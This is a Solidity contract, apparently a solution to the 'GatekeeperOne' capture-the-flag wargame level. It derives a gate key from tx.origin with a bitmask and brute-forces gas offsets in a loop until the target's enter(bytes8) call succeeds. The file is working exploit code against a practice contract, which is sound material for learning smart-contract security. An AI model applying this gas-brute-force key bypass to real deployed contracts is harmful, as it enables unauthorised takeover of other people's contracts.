// SPDX-License-Identifier: MIT
pragma solidity 0.6.6;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./GatekeeperOne.sol";

contract KeyAttacker {
    using SafeMath for uint256;
    GatekeeperOne public target;
    address public owner;

    // bytes8 public txOrigin16 = 0x07B0b92dF9c98473; //last 16 digits of your account

    //* https://stackoverflow.com/questions/68719198/explicit-type-conversion-in-remix
    bytes8 public txOrigin16 = bytes8(bytes20(tx.origin));
    bytes8 public key = txOrigin16 & 0xFFFFFFFF0000FFFF;

    event foundValue(uint256 value);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor(address _address) public {
        target = GatekeeperOne(_address);
        owner = msg.sender;
    }

    function breakIn() public onlyOwner {
        for (uint256 i = 0; i < 200; i++) {
            (bool result, bytes memory data) = address(target).call{
                gas: i + 150 + 8191 * 3
            }(abi.encodeWithSignature("enter(bytes8)", key));
            if (result) {
                emit foundValue(i);
                break;
            }
        }
    }
}
